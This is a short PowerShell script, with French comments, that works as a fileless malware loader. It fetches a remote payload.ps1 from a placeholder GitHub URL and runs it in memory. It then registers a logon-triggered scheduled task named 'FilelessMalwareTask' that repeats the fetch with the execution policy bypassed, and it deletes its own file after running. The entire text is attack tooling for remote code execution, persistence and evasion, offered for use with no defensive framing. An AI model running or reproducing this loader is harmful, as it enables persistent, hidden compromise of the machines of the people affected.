# Télécharger et exécuter une charge utile
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/payload.ps1')

# Ajouter une tâche planifiée pour persistance
$TaskName = "FilelessMalwareTask"
$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/payload.ps1')"
$TaskTrigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -Action $TaskAction -Trigger $TaskTrigger -TaskName $TaskName -Description "Executes a fileless script at logon"

 # Suppression automatique du script après exécution
Start-Sleep -Seconds 2  # Petite pause pour garantir que toutes les tâches précédentes sont terminées
Remove-Item -Path $MyInvocation.MyCommand.Path -Force

